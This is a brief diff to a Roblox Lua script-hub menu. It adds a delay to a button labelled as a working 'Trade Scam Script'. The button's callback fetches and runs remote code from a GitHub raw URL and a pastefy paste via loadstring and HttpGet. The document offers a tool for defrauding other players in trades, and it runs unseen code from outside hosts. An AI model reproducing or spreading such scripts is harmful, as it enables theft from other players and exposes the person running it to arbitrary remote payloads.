@@ -51,6 +51,7 @@ local Tab = Window:CreateTab("Scripts", "home")
 Tab:CreateButton({
     Name = "Trade Scam Script(WORKING!),only work public server,no loading screen,wait 5 minutes",
     Callback = function()
+        wait(15)
         loadstring(game:HttpGet("https://raw.githubusercontent.com/PhatLee877/faketrade/refs/heads/main/ScriptByPhatLee"))()
         loadstring(game:HttpGet("https://pastefy.app/fVgYsz1u/raw"))()
     end
